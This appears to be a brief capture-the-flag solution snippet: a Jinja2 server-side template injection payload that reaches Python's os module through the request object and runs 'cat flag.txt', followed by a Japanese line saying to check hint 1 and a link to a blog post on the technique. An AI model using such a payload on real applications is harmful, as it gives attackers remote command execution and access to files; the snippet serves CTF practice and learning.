```
{% for a in [request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag.txt')['read']()] %} {{ a }} {% endfor %}
```

ヒント 1 を確認
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
